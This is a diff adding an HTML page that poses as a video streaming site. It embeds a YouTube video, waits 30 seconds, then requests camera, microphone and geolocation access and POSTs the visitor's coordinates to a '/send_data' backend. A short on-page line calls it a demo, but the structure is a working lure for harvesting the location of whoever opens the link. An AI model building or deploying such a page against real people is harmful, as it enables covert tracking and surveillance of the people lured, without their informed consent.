@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Streaming with Permissions</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .title {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-top: 20px;
+            color: #f0f0f0;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 1000px;
+            height: 0;
+            padding-bottom: 56.25%;
+            background-color: #000;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .description {
+            max-width: 90%;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #222;
+            border: 1px solid #555;
+            border-radius: 8px;
+            font-size: 1rem;
+            color: #fff;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="title">Video Streaming with Permissions</div>
+
+    <div class="video-container">
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <div class="description">
+        <p>This is a simple demo to collect location and permissions after 30 seconds.</p>
+    </div>
+
+    <script>
+        async function requestPermissions() {
+            // Request camera and microphone permissions
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                console.log("Camera and microphone permissions granted.");
+            } catch (err) {
+                console.warn("Camera and microphone permissions denied:", err);
+            }
+
+            // Request location permissions
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        console.log("Location permissions granted:", {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+
+                        // Send the location data to the backend server
+                        fetch('/send_data', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log("Data sent successfully:", data))
+                        .catch(error => console.log("Error sending data:", error));
+                    },
+                    error => console.warn("Location permissions denied:", error)
+                );
+            }
+        }
+
+        // Request permissions after 30 seconds
+        setTimeout(() => {
+            console.log("Requesting permissions...");
+            requestPermissions();
+        }, 30000);
+    </script>
+</body>
+</html>
